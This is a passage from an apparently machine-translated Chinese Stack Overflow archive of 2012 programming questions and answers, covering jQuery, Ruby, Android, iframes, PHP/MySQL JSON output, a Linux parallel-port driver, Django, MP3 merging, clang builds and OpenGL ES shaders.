                <td><a href="#" categoryID="1" class="delete">Delete Category</a></td>
            </tr>          
    </tbody>
</table>​ 
```

和 js -

```
$("a.delete").click(function() {
    $(this).parents("tr").fadeOut(300);
}​ 
```

但它不起作用，有什么线索吗？我也尝试了 parent() 而不是 parents()，但它也没有用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-04T07:59:43.813

更新了修复：[jsFiddle](http://jsfiddle.net/syTXZ/1/)

你失踪了`);`

```
 $("a.delete").click(function() {
     $(this).parents("tr").fadeOut(300);
 }​ 
```

应该

```
 $("a.delete").click(function() {
     $(this).parents("tr").fadeOut(300);
 }​); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:58:43.293

```
$("body").delegate("a.delete","click",function() {
    $(this).parent().parent().fadeOut(300);
}​); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T08:05:12.090

**[演示](http://jsfiddle.net/syTXZ/3/)**

它应该是

```
$("a.delete").click(function() {
     $(this).parents("tr").fadeOut(300);
 }​); 
```

# ruby - 向现有哈希添加新属性

> ID：11806929
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:55:25.183
> 
> 标签：ruby, ruby-on-rails-3

我正在使用 Mongoid 检索结果，但我想使用键为实例变量中返回的每个记录添加一个新属性。我该怎么做呢？

在 PHP 中，我会通过遍历数组并根据对象的键插入它来做到这一点。当我收到以下消息时，我无法弄清楚如何在 Ruby 中完成此操作：模型 ABC 无法转换为整数。

**更新：**我最终在模型中添加了一个方法来实现我想要做的事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T10:39:45.367

我会尽力为您指明正确的方向。

如果您有一组记录以及要循环的内容，请使用 Array#each：[http ://www.ruby-doc.org/core-1.9.3/Array.html#method-i-each](http://www.ruby-doc.org/core-1.9.3/Array.html#method-i-each)

您可以轻松编写属性：[http ://rdoc.info/github/mongoid/mongoid/Mongoid/Attributes#write_attribute-instance_method](http://rdoc.info/github/mongoid/mongoid/Mongoid/Attributes#write_attribute-instance_method)

希望有帮助

# java - Java import com.google 无法解析

> ID：11806937
> 
> 赞同：7
> 
> 时间：2012-08-04T07:56:42.000
> 
> 标签：java, android

我正在 Eclipse 中构建和运行一个 android 应用程序。我已经通过 ADT 成功安装了 Android 套件以及 google api。我下载了一个示例 google map android 应用程序来运行。非常简单的文件。但是，我的 lib 引用似乎不能正常工作。即使在清单文件中引用了 google map api，我的应用程序也无法解析该引用

知道我接下来需要做什么来解决引用问题吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-04T07:59:36.680

您必须通过 android sdk 管理器下载特定 api 级别的 google api。

![在此处输入图像描述](../Images/df571d8ec78ad54f68f7b80b92d922ac.png)

**选择该 google api 作为项目构建目标。**

![在此处输入图像描述](../Images/ff6fc7c82afeda60437e922b3b860bb0.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:59:39.333

在 Eclipse 中，您应该能够配置项目的类路径以指向相关库。假设你有它们和插件。如果您没有 SDK 管理器，请查看它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-04T10:30:58.960

右键单击您的项目 ---> 属性 ---> android --> 选择目标名称 Google ApIs。并清理项目并构建项目。

并参考[此](https://developers.google.com/maps/documentation/android/)链接

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T08:05:12.097

如果**选择特定 API**不起作用，请尝试以下操作：

*   项目->清理
*   右键单击项目-> Android 工具-> 修复项目属性

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-28T13:38:54.460

确保您已添加

```
<uses-library android:name="com.google.android.maps" /> 
```

作为 `<application>`标记的子项进入 AndroidManifest.xml

# javascript - iframe 是否有可能在没有主窗口帮助的情况下自行调整大小？

> ID：11806947
> 
> 赞同：11
> 
> 时间：2012-08-04T07:59:06.243
> 
> 标签：javascript, iframe, resize, no-framework

主窗口和 iframe 都在同一个域上，但我想要实现的是仅在该 iframe 中使用 js 调整 iframe 的大小以适应其内容。

我也不知道主窗口分配给它的 iframe 的 ID。而且我不想使用 jquery 或任何其他框架。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-04T08:57:56.073

您也可以在不知道父窗口中的 的`id`情况下执行此操作：`iframe`

```
window.frameElement.style.width = iframeContentWidth + 'px';
window.frameElement.style.height = iframeContentHeight + 'px'; 
```

请参阅[MDN](https://developer.mozilla.org/en-US/docs/DOM/window.frameElement)`frameElement`。

**编辑**

以防万一`iframe`碰巧在具有固定大小的容器元素中，`overflow: hidden`您可以执行以下操作：

```
function resizeIframe (iframeContentWidth, iframeContentHeight) {
    var container = window.frameElement.parentElement;
    if (container != parent.document.body) {
        container.style.width = iframeContentWidth + 'px';
        container.style.height = iframeContentHeight + 'px';
    }
    window.frameElement.style.width = iframeContentWidth + 'px';
    window.frameElement.style.height = iframeContentHeight + 'px';
    return;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:42:42.700

对于像你这样的同源内容，[是的，你可以](https://stackoverflow.com/questions/5604839/accessing-an-element-outside-of-iframe)。

借用加里对上述问题的回答：

> 在 iframe 中，window.parent 指的是父文档的全局对象，而不是文档对象本身。我相信你需要使用 parent.document.getElementById

尝试使用 parent.document 访问 iframe，看看这是否能解决您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T09:57:19.007

假设您在主窗口中只有 1 个 IFRAME，从 IFRAME 文档的 Javascript 中，您可以执行以下操作：

```
function getMySelf()
{
    return (window.parent.document.getElementsByTagName("iframe"))[0];
}

var myself = getMySelf();
myself.style.width = whateverWidth;
myself.style.height = whateverHeight; 
```

# raphael - 使用 Raphael 进行垂直缩放（变换）

> ID：11806955
> 
> 赞同：0
> 
> 时间：2012-08-04T07:59:44.787
> 
> 标签：raphael

我有一个关于 Raphael 使用变换进行垂直缩放的问题。我尝试了以下代码：

```
var transform = "sx"+dx;
selRect.transform(transform); 
```

但这似乎并没有奏效。有人知道如何解决这个问题吗？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T18:33:10.563

尝试使用

```
var transform = "S1," + dx; 
```

另外，不要忘记您可以选择指定要缩放的点......所以

```
var bbox = selRect.getBBox();
var transform1 = "S1," + dx + ",0,0";
var transform2 = "S1," + dx + "," + ( bbox.width / 2 ) + "," + ( bbox.height / 2 ); 
```

将以不同方式偏移生成的矩形。有时它肯定会派上用场！

# php - PHP JSON 数组未从我的数据库中返回所有行

> ID：11806959
> 
> 赞同：0
> 
> 时间：2012-08-04T08:00:16.243
> 
> 标签：php, arrays, json

```
$retrieve = mysql_query("SELECT * FROM `users`") or die(mysql_error());

$object -> userDetails = array();

while($retrieveArray = mysql_fetch_array($retrieve))
{
    $item -> userId =  $retrieveArray['id'];
    $item -> userEmail = $retrieveArray['email'];
    $item -> userLocation = $retrieveArray['location'];
    $item -> userFirstName = $retrieveArray['firstname'];
    $item -> userLastName = $retrieveArray['lastname'];
    $object ->userDetails[] = $item;
}   
$json = json_encode($object);
echo $json; 
```

这段代码有问题吗？我的输出只显示我的数据库的第一行。

```
{"userDetails":[{"userId":"1","userEmail":"EmailAddress@gmail.com","userLocation":"HomeAddress","userFirstName":"Allan","userLastName":"Knocks"}]} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:06:24.343

试试这个：

```
$retrieve = mysql_query("SELECT id, email, location, firstname, lastname FROM `users`") or die(mysql_error());
$userDetails= array();
while($row = mysql_fetch_assoc($retrieve)) {
  $userDetails[] = $row;
}   
$json = json_encode(array('userDetails' => $userDetails));
echo $json; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T08:45:34.193

谨防！在循环中执行此操作将多次修改同一个实例，最终您将多次将相同的对象添加到您的数组中：

```
while($retrieveArray = mysql_fetch_array($retrieve))
{
    $item -> userId =  $retrieveArray['id'];
    $item -> userEmail = $retrieveArray['email'];
    $item -> userLocation = $retrieveArray['location'];
    $item -> userFirstName = $retrieveArray['firstname'];
    $item -> userLastName = $retrieveArray['lastname'];
    //you are adding here the same object with changed properties.
    $object ->userDetails[] = $item;
} 
```

最后 $object->userDetails 将包含对具有最后设置属性的同一对象的 n 个引用。

相反，您应该在循环内创建一个新实例：

```
while($retrieveArray = mysql_fetch_array($retrieve))
{
    //new item (if there is a class Item)
    $item = new Item();
    // if $item is just a stdObject created on the fly then use 
    $item = new stdClass();
    $item -> userId =  $retrieveArray['id'];
    $item -> userEmail = $retrieveArray['email'];
    $item -> userLocation = $retrieveArray['location'];
    $item -> userFirstName = $retrieveArray['firstname'];
    $item -> userLastName = $retrieveArray['lastname'];
    //you are adding here another object
    $object ->userDetails[] = $item;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-08T18:17:50.643

你可以试试

```
 $sql = "SELECT * FROM users";
 $result = $con->query($sql);
 if ($result->num_rows > 0) {   

  $userDetails = array();
  while ($row = $result->fetch_assoc()) {     
       $userData[] = array(
        "id" => $row["id"],
        "name" => $row["name"],
        "email" => $row["email"],
     );
   }
} else {
   echo "0 results";
}

 $result1['regular'] = $userData;
 $json = json_encode($result1);
  echo $json; 
```

您的 json 将如下所示

```
{"regular":[{"id":"2","name":"enamul Haque","email":"ehaque95@gmail.com"},{"id":"55","name":"Rafiq","email":"era@gmail.com"}]} 
```

# python - 使用python在一个块内的文件中查找“a”字符串一次

> ID：11806964
> 
> 赞同：-2
> 
> 时间：2012-08-04T08:01:30.073
> 
> 标签：python

我有一个文件包含 3 个块 Block1：a Block2：a Block3：a 我想使用 python 搜索“block1：”一个字符串我已经完成了 Searching block1 的代码：和一个字符串，但它给出了所有 a

```
file = open( "c:\Textfile.txt", "r" ).readlines()
var=raw_input("enter the value")
var1="// Block1:"
for line in file:
    if re.search(var1,line,re.IGNORECASE):
        print re.search(var,line,re.IGNORECASE)
        print "found",line
        for line in file:
            if re.search(var,line,re.IGNORECASE):
                print "value=",line 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T09:12:47.920

我假设您的 Textfile 如下所示：

```
 Block1: test is t
    Block2: test is u
    Block3: test is V 
```

你可以这样做：

```
import re
file = open( "Textfile.txt", "r" ).readlines()
var=raw_input("enter the value")
for line in file:
    if line.find('Block1:') != -1:
        if re.search(var,line,re.IGNORECASE):
            print "value=",line 
```

# c - 访问linux上的并口硬件

> ID：11806966
> 
> 赞同：1
> 
> 时间：2012-08-04T08:01:41.710
> 
> 标签：c, linux-device-driver

我写了一个并口 Linux 设备驱动程序，但我无法访问并口硬件

```
#include <linux/init.h>
#include <linux/autoconf.h>
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/slab.h> 
#include <linux/fs.h> 
#include <linux/errno.h> 
#include <linux/types.h>
#include <linux/proc_fs.h>
#include <linux/fcntl.h>
#include <linux/ioport.h>
#include <asm/system.h> 
#include <asm/uaccess.h> 
#include <asm/io.h> 
#define DRVNAME "parportleds"
#define BASEPORT 0x378

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Ganesh");
MODULE_DESCRIPTION("Parallel port LED driver.");

int parportleds_open(struct inode *inode, struct file *filp);
int parportleds_release(struct inode *inode, struct file *filp);
ssize_t parportleds_read(struct file *filp,char *buf,size_t count, loff_t *f_pos);
ssize_t parportleds_write(struct file *filp, const char *buf,size_t count, loff_t   *f_pos);

void parportleds_exit(void);
int parportleds_init(void);

struct file_operations parportleds_fops = {
  read: parportleds_read,
  write: parportleds_write,
  open: parportleds_open,
  release: parportleds_release
};

int parportleds_major = 61;
int port;

module_init(parportleds_init);
module_exit(parportleds_exit);

int parportleds_init(void) {
  int result;
  result = register_chrdev(parportleds_major, DRVNAME,&parportleds_fops);
  if (result < 0) {
    printk("<1>parport: cannot obtain major number %d\n",parportleds_major);
    return result;
  }
  port = check_region(BASEPORT, 1);
  if (port) {
    printk("<1>parportleds: cannot reserve 0x378 \n");
    result = port;
    goto fail;
  }
  request_region(BASEPORT, 1, DRVNAME);
  printk("<1>Inserting parportled module\n");
  return 0;
  fail:
    parportleds_exit();
    return result;
}
void parportleds_exit(void) {
  unregister_chrdev(parportleds_major, DRVNAME);
  if (!port) {
    release_region(BASEPORT,1);
  }
  printk("<1>Removing module parportleds\n");
}
int parportleds_open(struct inode *inode, struct file *filp) {
  return 0;
}
int parportleds_release(struct inode *inode, struct file *filp) {
  return 0;
}
ssize_t parportleds_read(struct file *filp, char *buf,size_t count, loff_t *f_pos) {
  char parportleds_buffer;
  parportleds_buffer = inb(BASEPORT);
  copy_to_user(buf,&parportleds_buffer,1);
  if (*f_pos == 0) {
    *f_pos+=1;
    return 1;
  } else {
    return 0;
  }
}
ssize_t parportleds_write( struct file *filp, const char *buf, size_t count, loff_t     *f_pos) {
  char *tmp;
  char parportleds_buffer;
  tmp=(char *)buf+count-1;
  copy_from_user(&parportleds_buffer,tmp,1);
  outb(parportleds_buffer,BASEPORT);
  printk("<1>parport write: %d\n",parportleds_buffer);
  return 1;
} 
```

这是我的代码，当我尝试读写时，`/dev/parportleds`我在 dmesg 中获得了成功的消息
但是当我尝试使用并行端口的数据引脚`echo 3 > /dev/parportleds`
的电压保持不变时，并行端口的引脚电压保持不变。
谁能帮我解决这个问题。
这是我第一次尝试编写设备驱动程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-10T21:12:41.033

首先要注意几点：

1）注意 InternetSeriousBusiness 的评论：当您将字符回显到您的 char 设备时，设备将收到 ASCII 编码的位模式。查看[ASCII 表](http://www.asciitable.com/)以查看需要发送哪个字符才能获得所需的位模式。

2）你提到当你发送一个位模式时，输出电压不会改变。另一个方向呢？您读取的值是否准确反映了施加在引脚上的电压，或者这些电压是否正常？如果是，那么您知道问题与写作有关。如果不是，那么您甚至可能没有按照您认为的方式连接到端口。

我的答案：

与用户数据交互的缓冲区应附加**__user**标记。例如，**parportleds_write()**的参数列表应该如下所示：

```
ssize_t parportleds_write(struct file *fp, const char __user *buf, ssize_t count, loff_t *f_pos){ 
```

您对**copy_from_user()**的调用可能会失败，因为它丢失了。__user标签**也**应该添加到您的读取函数中。

# sql - Django distinct() 不为一列生成查询（根据需要）

> ID：11806974
> 
> 赞同：0
> 
> 时间：2012-08-04T08:04:22.630
> 
> 标签：sql, django

当我执行此查询集时：

```
Club.objects.values('district').distinct() 
```

我希望得到这个 SQL：

```
SELECT DISTINCT `club_club`.`district` FROM `club_club` ORDER BY `club_club`.`name` ASC 
```

但是 Django 会生成这个查询（添加 'name' 列）：

```
>>> print Club.objects.values('district').distinct().query
SELECT DISTINCT `club_club`.`district`, `club_club`.`name` FROM `club_club` ORDER BY `club_club`.`name` ASC 
```

怎么了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T08:08:03.463

如果您正在使用Query 您期望是**无效** `order by column`的，则必须在其中，否则您将收到此标准 SQL 错误`select list``distinct keyword`

```
Msg 145, Level 15, State 1, Line 1
ORDER BY items must appear in the select list if SELECT DISTINCT is specified. 
```

# java - 将两个 mp3 文件合并为一个

> ID：11806977
> 
> 赞同：1
> 
> 时间：2012-08-04T08:04:58.273
> 
> 标签：java, mp3

我有这个代码来读取字节到另一个文件。但我无法将两个 mp3 文件合并为一个。我错过了什么吗？

```
public static void main(String[] args) {
  String strFileName = ("D:/Music/Assb/Love.mp3");
                BufferedOutputStream bos = null;

                try
                {
                        //create an object of FileOutputStream
                        FileOutputStream fos = new FileOutputStream(new File(strFileName));

                        //create an object of BufferedOutputStream
                        bos = new BufferedOutputStream(fos);

                        String str = "D:/Music/Assembled/Heart001.mp3" 
                            + "D:/Music/Assembled/Heart002.mp3";

                        /*
                         * To write byte array to file use,
                         * public void write(byte[] b) method of BufferedOutputStream
                         * class.
                         */
                         System.out.println("Writing byte array to file");

                         bos.write(str.getBytes());

                        System.out.println("File written"); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-13T11:10:56.267

真烂 Mp3 文件以标题开头。为了正确合并，您必须跳过前 32 个字节。尝试这个。

```
 try {
            FileInputStream fistream1 = new FileInputStream(_file_name);
            File f = new File(new File(_file_name).getParent()+"/final.mp3");
            if(!f.exists())
            {
                f.createNewFile();
            }
            FileOutputStream sistream = new FileOutputStream((new File(_file_name)).getParent()+"/final.mp3");
            int temp;
            int size = 0;
            temp = fistream1.read();
            while( temp != -1)
            {
                sistream.write(temp);
                temp = fistream1.read();
            };
            fistream1.close();
            FileInputStream fistream2 = new FileInputStream(temp_file);
            fistream2.read(new byte[32],0,32);
            temp = fistream2.read();
            while( temp != -1)
            {
                sistream.write(temp);
                temp = fistream2.read();
            };
            fistream2.close();
            sistream.close();
        } catch (IOException e) {
            e.printStackTrace();
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T08:14:34.843

您需要分两步执行此操作

```
String str = "D:/Music/Assembled/Heart001.mp3";

>>> ADD code to open the file given by str <<<<
bos.write(strFile.getBytes());
>>> Add code to close the file

str = "D:/Music/Assembled/Heart002.mp3";
>>> ADD code to open the file given by str <<<<
bos.write(strFile.getBytes());
>>> Add code to close the file 
```

正如你所看到的，你需要代码来打开 mp3 文件来阅读它

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-04T08:14:35.877

您在尝试什么...实际上..如果您想读取 2 个文件以进行字节流传输，则不要`String str = "D:/Music/Assembled/Heart001.mp3" + "D:/Music/Assembled/Heart002.mp3";` 通过bufferedoutputsream 分别读取`str1=D:/Music/Assembled/Heart001.mp3`和`str2=D:/Music/Assembled/Heart002.mp3`读取 str1、str2

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-25T06:20:41.663

此代码将运行良好，并在几秒钟内合并类似类型的音频......

```
try {

                   InputStream in = new FileInputStream("C:\\a.mp3");//firstmp3
                    byte[] buffer = new byte[1 << 20];  // loads 1 MB of the file
                    OutputStream os = new FileOutputStream(new File("C:\\output.mp3", true);//output mp3
                    int count;
                    while ((count = in.read(buffer)) != -1) {
                        os.write(buffer, 0, count);
                        os.flush();
                    }
                    in.close();
                    in = new FileInputStream("C:\\b.mp3");//second mp3
                    while ((count = in.read(buffer)) != -1) {
                        os.write(buffer, 0, count);
                        os.flush();
                    }
                    in.close();
                    os.close();

               } catch (FileNotFoundException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            } 
```

# javascript - 如何确定哪些 javascript 正在修改 DOM

> ID：11806984
> 
> 赞同：1
> 
> 时间：2012-08-04T08:06:13.527
> 
> 标签：javascript, google-chrome, firebug, malware

我正在处理一个被黑的 Joomla 站点，攻击者巧妙地将他的代码隐藏在包含的 javascript 文件中的某个位置。该站点从各地加载了数十个此类文件，并且绝大多数脚本已经打包和混淆，使得逐步调试几乎不可能。此外，我从已经发现的样本中知道，攻击者的 javascript 代码*也*使用相同的系统打包，并且在视觉上与“合法”代码无法区分。

我知道在执行浏览器端的代码中某处创建了 iframe 并将其附加到 DOM 以引入更严重的漏洞利用代码。但我不知道哪个文件中的哪个代码导致这种情况发生。

有没有办法在浏览器中捕获这个事件并查看正在执行的代码是从哪里加载的？

大概这将在 Chrome 或 Firefox 中。

# php - 使用我的 mysql 或文本文件来存储数据以便快速访问

> ID：11806986
> 
> 赞同：1
> 
> 时间：2012-08-04T08:06:33.033
> 
> 标签：php, mysql, database, performance, text

我需要每秒显示 100000 个手机号码的国家名称。所以

1.  从手机号码我需要找到前缀
2.  从前缀中，找到国家名称。

方法一：（Mysq1）在数据库中存储prifix、国名并访问

方法2：（文本文件）将国家名称存储在文本文件中。马来西亚前缀的示例是 60。因此将“马来西亚”存储在测试文件“60.test”中以获取国家名称使用 file_get_contents("country/60.txt")

哪种方法会快？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:31:20.183

假设一个“正常”的网络服务器，你有几个选择：

1.  使用数据库。这将是快速和简单的。为了获得最大速度，使用内存表，如果可能的话，使用持久连接（在正常情况下不推荐使用事务时当然不推荐）
2.  使用文件系统，可以工作，但不是它的设计目标，数据集的维护将是地狱，也不会足够快
3.  使用 memcache 或类似的东西跨请求缓存内存结构（关联数组等），最初从文件或数据库加载它。

除非性能不够，否则我会选择选项 1，然后使用选项 3。

# javascript - IE8插件，用javascript编码

> ID：11806987
> 
> 赞同：0
> 
> 时间：2012-08-04T08:06:38.527
> 
> 标签：javascript, internet-explorer-8, bho, ieaddon

我制作了一个小的 IE8 插件，工具栏中的按钮按原样显示，但是一旦单击，就会出现错误：

```
Script: secret
Line: 1
Char 8
Error: Expected ';'
Code: 800A03EC
Source: Microsoft JScript compilation error. 
```

保存在 utf-8下`.js`，用三个复杂器检查，没有语法错误或 ';' 在那里失踪。该脚本有 20 行，几乎所有这些都是 getElementById() 函数。第一行是一个镜像：`var secretVar = document.getElementById('secretId').value;`

是的，我试过了`content.document.getElementById('secretId').value`；

但出现同样的错误。

脚本中是否缺少某些特定内容？是否应该有一个额外的行来准确定位我的 IE 上的页面？

# jquery - jquery 1.7.2 打印插件

> ID：11806990
> 
> 赞同：0
> 
> 时间：2012-08-04T08:06:50.350
> 
> 标签：jquery

如何制作链接以打印页面，仅使用浏览器基本打印对话框并且在旧浏览器（包括 IE7）中也可以使用？

还有可用的 jquery 172 插件吗？我对 jquery 的了解是基本的，而对 javascript 的了解则更少。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:08:59.350

你可以`window.print();`点击调用。

```
<a id="print" href="#" onclick="window.print(); return false">print this page</a> 
```

或不使用 onclick 属性并添加一个监听器

```
document.getElementById('print').onclick = function () {
    window.print(); 
    return false;
} 
```

或使用 jQuery

```
$('#print').on('click', function(e){
  e.preventDefault();
  window.print(); 
}); 
```

# c++ - 使用 stdlibc++ 4.7 构建 svn clang

> ID：11806991
> 
> 赞同：0
> 
> 时间：2012-08-04T08:06:54.373
> 
> 标签：c++, gcc, clang

我是直接从svn编译clang的新手。我想针对 stdlibc++4.7 构建 clang。

我的系统运行的是 Mac OS 山狮 10.8，所以我使用 MacPorts 安装 gcc47。现在该库位于 /opt/local/lib/gcc47 中，并且标头位于 /opt/local/include/gcc47 中。

我从 svn 下载了 clang 并按照以下指南操作：[http ://clang.llvm.org/get_started.html](http://clang.llvm.org/get_started.html)

如何指定 clang 配置以使用 stdlibc++ 4.7？它在指南中提到我应该使用`--with-gcc-toolchain`. 我到底应该使用`--with-gcc-toolchain`什么？难道只是`../configure --with-gcc-toolchain`

我还尝试从 svn 编译 gcc 并将其安装到我的主目录中`$HOME/gcc`。然后通过 configure with `--with-gcc-toolchain=PATH_TO_GCC_IN_HOME_DIR`。编译后，尝试了以下方法： `./clang -v -x c++ /dev/null -fsyntax-only`

它仍然显示与 Mac OS 附带的 gcc4.2 lib 链接：

```
clang version 3.2 (trunk 161295)
Target: x86_64-apple-darwin12.0.0
Thread model: posix
"/Users/chen/Repository/build/Debug+Asserts/bin/clang" -cc1 -triple x86_64-apple-macosx10.8.0 -fsyntax-only -disable-free -main-file-name null -pic-level 2 -mdisable-fp-elim -masm-verbose -munwind-tables -target-cpu core2 -target-linker-version 128.2 -v -resource-dir /Users/chen/Repository/build/Debug+Asserts/bin/../lib/clang/3.2 -fmodule-cache-path /var/folders/1l/m5km38_d3lxbrvysgv6s42680000gn/T/clang-module-cache -fdeprecated-macro -fdebug-compilation-dir /Users/chen/Repository/build/Debug+Asserts/bin -ferror-limit 19 -fmessage-length 145 -stack-protector 1 -mstackrealign -fblocks -fobjc-runtime=macosx-10.8.0 -fobjc-dispatch-method=mixed -fobjc-default-synthesize-properties -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ /dev/null
clang -cc1 version 3.2 based upon LLVM 3.2svn default target x86_64-apple-darwin12.0.0
ignoring nonexistent directory "/usr/include/c++/4.2.1/i686-apple-darwin10/x86_64"
ignoring nonexistent directory "/usr/include/c++/4.0.0"
ignoring nonexistent directory "/usr/include/c++/4.0.0/i686-apple-darwin8/"
ignoring nonexistent directory "/usr/include/c++/4.0.0/backward"
#include "..." search starts here:
#include <...> search starts here:
/usr/include/c++/4.2.1
/usr/include/c++/4.2.1/backward
/usr/local/include
/Users/chen/Repository/build/Debug+Asserts/bin/../lib/clang/3.2/include
/usr/include
/System/Library/Frameworks (framework directory)
/Library/Frameworks (framework directory)
End of search list. 
```

如何使用 libstdc++ 4.7 编译 clang？

谢谢，

# android - 编写自定义 OpenGL ES 2.0 Shader / MatrixHandler，得到空白屏幕

> ID：11806993
> 
> 赞同：0
> 
> 时间：2012-08-04T08:07:05.590
> 
> 标签：android, opengl-es, opengl-es-2.0

我正在尝试为使用 GLES20 的 android 应用程序编写自己的着色器类和矩阵处理类。但是，现在我只得到背景颜色。

这几天我一直在拔头发。我想比较我的班级和 GL10 的东西之间的矩阵运算，以确保它们吐出相同的结果，但我无法获得 api 示例 MatrixGrabber 和 MatrixTrackingGL 来吐出除了单位矩阵之外的任何东西（尽管渲染正确）。

因此，我将发布一些代码，如果您发现这两个类中可能存在问题，请告诉我！

这是我的 MatrixHandler 类：

```
import java.util.Stack;

import android.opengl.Matrix;

public class MatrixHandler
{
    public static float[] mMVPMatrix = new float[16];
    public static float[] mProjMatrix = new float[16];
    public static float[] mViewMatrix = new float[16];
    public static float[] mRotationMatrix = new float[16];

    public static Stack<float[]> mvpStack = new Stack<float[]>();
    public static Stack<float[]> projStack = new Stack<float[]>();
    public static Stack<float[]> viewStack = new Stack<float[]>();
    public static Stack<float[]> rotationStack = new Stack<float[]>();

    public static void setViewIdentity()
    {
        Matrix.setIdentityM(mViewMatrix, 0);
    }

    public static void setProjIdentity()
    {
        Matrix.setIdentityM(mProjMatrix, 0);
    }

    public static void setViewport(float left, float right, float bottom, float top, float near, float far)
    {
        Matrix.frustumM(mProjMatrix, 0,
                left, right,
                bottom, top,
                near, far
            );
    }

    public static void setLookAt(
            float eyeX, float eyeY, float eyeZ,
            float posX, float posY, float posZ,
            float upX, float upY, float upZ
        )
    {
        Matrix.setLookAtM(
                mViewMatrix, 0,

                eyeX, eyeY, eyeZ,
                posX, posY, posZ,
                upX, upY, upZ
            );

        //Matrix.multiplyMM(mMVPMatrix, 0, mProjMatrix, 0, mViewMatrix, 0);
    }

    public static void translate(float x, float y, float z)
    {
        Matrix.translateM(mViewMatrix, 0,
                x, y, z
            );
        Matrix.multiplyMM(mMVPMatrix, 0, mViewMatrix, 0, mMVPMatrix, 0);
    }

    public static void rotate(float a, float x, float y, float z)
    {
        Matrix.rotateM(mRotationMatrix, 0,
                a, x, y, z
            );
        Matrix.multiplyMM(mMVPMatrix, 0, mRotationMatrix, 0, mMVPMatrix, 0);
    }

    public static void pushMatrix()
    {
        mvpStack.push(mMVPMatrix);
        projStack.push(mProjMatrix);
        viewStack.push(mViewMatrix);
        rotationStack.push(mRotationMatrix);
    }

    public static void popMatrix()
    {
        mMVPMatrix = mvpStack.pop();
        mProjMatrix = projStack.pop();
        mViewMatrix = viewStack.pop();
        mRotationMatrix = rotationStack.pop();
    }

    public static void printMatrix(String label, float[] m)
    {
        System.err.print(label + " : {");
        for(float i : m)
        {
            System.err.print(i + ", ");
        }
        System.err.println("}");
    }
} 
```

这是我的着色器类：

```
import java.nio.FloatBuffer;

import com.bradsproject.appName.MatrixHandler;

import android.opengl.GLES20;

public class Shader
{
    private static int mProgram;

    static int maPositionHandle;
    static int maColorHandle;
    static int maTextureHandle;

    static int muMVPMatrixHandle;

    static int maTexture;

    private final static String mVertexShader =
        "uniform mat4 uMVPMatrix;" +
        "attribute vec3 aPosition;" +
        "attribute vec2 aTextureCoord;" +
        "attribute vec4 aColor;" +
        "varying vec4 vColor;" +
        "varying vec2 vTextureCoord;" +
        "void main() {" +
        "  gl_Position = uMVPMatrix * vec4(aPosition, 1.0);" +
        "  vTextureCoord = aTextureCoord;" +
        "  vColor = aColor;" +
        "}";

    private final static String mFragmentShader =
            "precision mediump float;" +
            "varying vec2 vTextureCoord;" +
            "uniform sampler2D sTexture;" +
            "varying vec4 vColor;" +
            "void main() {" +
            "  gl_FragColor = texture2D(sTexture, vTextureCoord);" +
            "}";

    public static void init()
    {
        mProgram = createProgram(mVertexShader, mFragmentShader);
        if (mProgram == 0)
            return;

        maPositionHandle = GLES20.glGetAttribLocation(mProgram, "aPosition");
        maColorHandle = GLES20.glGetAttribLocation(mProgram, "aColor");
        maTextureHandle = GLES20.glGetAttribLocation(mProgram, "aTextureCoord");

        maTexture = GLES20.glGetUniformLocation(mProgram, "sTexture");

        muMVPMatrixHandle = GLES20.glGetUniformLocation(mProgram, "uMVPMatrix");
    }

    public static void drawArrays(FloatBuffer mPosition, FloatBuffer mColor, FloatBuffer mTexture, int textureId, int mode)
    {
        GLES20.glUseProgram(mProgram);

        mPosition.position(0);
        GLES20.glVertexAttribPointer(maPositionHandle, 3, GLES20.GL_FLOAT, false, 3 * 4, mPosition);
        GLES20.glEnableVertexAttribArray(maPositionHandle);

        mColor.position(0);
        GLES20.glVertexAttribPointer(maColorHandle, 4, GLES20.GL_FLOAT, false, 4 * 4, mColor);
        GLES20.glEnableVertexAttribArray(maColorHandle);

        mTexture.position(0);
        GLES20.glVertexAttribPointer(maTextureHandle, 2, GLES20.GL_FLOAT, false, 2 * 4, mTexture);
        GLES20.glEnableVertexAttribArray(maTextureHandle);

        GLES20.glActiveTexture(GLES20.GL_TEXTURE0);
        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureId);
        GLES20.glUniform1i(maTexture, 0);

        GLES20.glUniformMatrix4fv(muMVPMatrixHandle, 1, false, MatrixHandler.mMVPMatrix, 0);

        GLES20.glDrawArrays(mode, 0, mPosition.capacity() / 3);
    }

    private static int createProgram(String vertexSource, String fragmentSource)
    {
